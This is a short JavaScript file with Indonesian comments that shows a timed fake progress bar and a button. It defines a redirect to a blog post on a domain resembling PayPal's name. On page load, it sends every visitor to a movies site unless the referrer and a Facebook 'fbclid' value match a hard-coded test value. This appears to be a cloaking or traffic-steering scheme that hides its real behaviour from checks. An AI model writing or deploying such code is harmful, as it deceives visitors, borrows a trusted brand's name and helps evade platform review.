function updateProgressBar(percentage) {
    var progressBar = document.querySelector('.progress-bar');
    progressBar.style.width = percentage + '%';
    progressBar.innerText = percentage + '%';
}

function showButton() {
    document.getElementById('button-container').style.display = 'block';
}

function hideButton() {
    document.getElementById('button-container').style.display = 'none';
}

function resetProgress() {
    var progressContainer = document.getElementById('progress-container');
    progressContainer.innerHTML = ''; // Menghapus elemen progres
    hideButton(); // Menyembunyikan tombol
    startProgress(); // Memulai kembali progres
}

function startProgress() {
    var currentPercentage = 0;
    var interval = setInterval(function() {
        currentPercentage += 5;
        updateProgressBar(currentPercentage);
        if (currentPercentage >= 100) {
            clearInterval(interval);
            hideProgressBar(); // Menyembunyikan elemen progres setelah mencapai 100%
            showButton(); // Menampilkan tombol setelah mencapai 100%
        }
    }, 500); // Ubah 500 menjadi durasi yang diinginkan (dalam milidetik)
}

function hideProgressBar() {
    var progressContainer = document.getElementById('progress-container');
    progressContainer.style.display = 'none'; // Menyembunyikan elemen progres setelah mencapai 100%
}

function redirectToURL() {
    window.location.href = 'https://www.cvpaypal.my.id/2024/03/why-your-business-needs-crm-system-to.html';
}

    // Fungsi untuk mendapatkan parameter dari URL
    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, "\\$&");
        var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, " "));
    }

    // Mengambil nilai parameter 'fbclid' dari URL
    var fbclid = getParameterByName('fbclid');

    // Jika hasilnya dari https://movies2392.pages.dev/?fbclid=test123, maka tidak ada redirect
    if (document.referrer.includes("movies2392.pages.dev") && fbclid === "test123") {
        // Tidak melakukan redirect
    } else {
        // Redirect ke https://movies2392.pages.dev
        window.location.href = "https://movies2392.pages.dev";
    }

// Memulai progres saat halaman dimuat
startProgress();
